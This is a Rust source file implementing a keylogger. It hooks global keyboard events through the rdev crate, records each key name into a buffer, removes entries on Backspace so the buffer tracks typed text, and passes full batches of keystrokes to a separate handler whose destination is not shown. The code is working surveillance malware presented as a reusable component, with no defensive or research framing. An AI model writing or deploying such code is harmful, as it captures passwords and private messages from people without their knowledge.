use crate::method::Method;

use rdev::{
    listen,
    Event,
    EventType::KeyPress,
    Key::Backspace,
};

use std::cell::RefCell;
use std::io::Result;
use std::rc::Rc;
use std::thread;

pub struct Keylogger {
    method: Rc<RefCell<Method>>,
    buffer: Rc<RefCell<Vec<String>>>,
    buffer_capacity: Rc<RefCell<usize>>,
}

impl Keylogger {
    pub fn new(method: Method) -> Self {
        Self {
            method: Rc::new(RefCell::new(method)),
            buffer: Rc::new(RefCell::new(Vec::new())),
            buffer_capacity: Rc::new(RefCell::new(1000)),
        }
    }

    pub fn set_buffer_capacity(self, new_cap: usize) -> Self {
        *self.buffer_capacity.borrow_mut() = new_cap;
        self
    }

    pub fn start(&mut self) {
        let buffer = self.buffer.clone();
        let method = self.method.clone();
        let buffer_cap = self.buffer_capacity.clone();
        let _ = listen(move |event: Event| {
            if let KeyPress(Backspace) = event.event_type {
                if buffer.borrow().is_empty() {
                    return;
                }
                buffer.borrow_mut().pop();
            }
            if let Some(name) = event.name {
                let mut buffer = buffer.borrow_mut();
                if buffer.len() == *buffer_cap.borrow() {
                    println!("{} / {}", buffer.len(), *buffer_cap.borrow());
                    buffer.push(name);
                    method.borrow_mut().handle(&buffer).expect("Failed to handle buffer");
                    buffer.clear();
                    return;
                }
                buffer.push(name);
            }
        });
    }
}
